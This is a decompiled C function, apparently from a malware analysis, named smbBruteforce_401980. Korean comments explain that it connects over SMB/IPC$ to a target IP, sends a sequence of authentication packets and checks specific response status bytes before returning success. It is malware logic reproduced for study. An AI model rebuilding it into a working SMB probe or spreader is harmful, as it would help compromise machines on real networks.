// --- Metadata ---
// Function Name: smbBruteforce_401980
// Address: 0x401980
// Exported At: 20250527_172726
// Signature: unknown_signature
// ---------------
int __cdecl smbBruteforce_401980(char *cp, u_short hostshort)
{
  SOCKET v2; // eax
  SOCKET v3; // esi
  int v4; // eax
  char v6; // [esp+Ah] [ebp-412h] BYREF
  char v7; // [esp+Bh] [ebp-411h]
  struct sockaddr name; // [esp+Ch] [ebp-410h] BYREF
  char buf; // [esp+1Ch] [ebp-400h] BYREF
  char v10[1020]; // [esp+1Dh] [ebp-3FFh] BYREF
  __int16 v11; // [esp+419h] [ebp-3h]
  char v12; // [esp+41Bh] [ebp-1h]

  buf = 0;
  memset(v10, 0, sizeof(v10));
  v11 = 0;
  v12 = 0;
  name.sa_family = 2;
  *&name.sa_data[2] = inet_addr(cp);            // SMB를 이용한 네트워크 기반의 인증 시도 
  *name.sa_data = htons(hostshort);             // IP 주소와 사용자 정보를 기반으로 패킷을 구성하고, 이를 타깃 IP에 보내 응답을 수신한 후 특정 조건이 맞는지 확인 
  v2 = socket(2, 1, 0);
  v3 = v2;
  if ( v2 != -1 )
  {
    if ( connect(v2, &name, 16) != -1           // SMB (IPC$) 프로토콜을 통해 특정 IP의 포트로 연결한 후 일련의 명령을 송수신 
      && send(v3, ::buf, 88, 0) != -1
      && recv(v3, &buf, 1024, 0) != -1
      && send(v3, byte_42E42C, 103, 0) != -1
      && recv(v3, &buf, 1024, 0) != -1 )        // SMB 세션 설정 및 사용자 인증을 시도하며, 성공 시 전역 버퍼에 사용자 정보 등을 설정하고 1 반환 
    {
      v6 = v10[31];
      v7 = v10[32];
      v4 = replace_placeholders_with_ipc_path_4017B0(cp, &v6);
      if ( send(v3, byte_42E494, v4, 0) != -1 && recv(v3, &buf, 1024, 0) != -1 )
      {
        byte_42E510 = v10[27];
        byte_42E512 = v10[27];
        v6 = v10[31];
        byte_42E514 = v10[31];
        v7 = v10[32];
        byte_42E515 = v10[32];
        byte_42E511 = v10[28];
        byte_42E513 = v10[28];
        byte_42E516 = v10[33];
        byte_42E517 = v10[34];
        if ( send(v3, byte_42E4F4, 78, 0) != -1
          && recv(v3, &buf, 1024, 0) != -1
          && v10[8] == 5
          && v10[9] == 2
          && !v10[10]
          && v10[11] == -64 )
        {
          closesocket(v3);
          return 1;
        }
      }
    }
    closesocket(v3);
  }
  return 0;
}
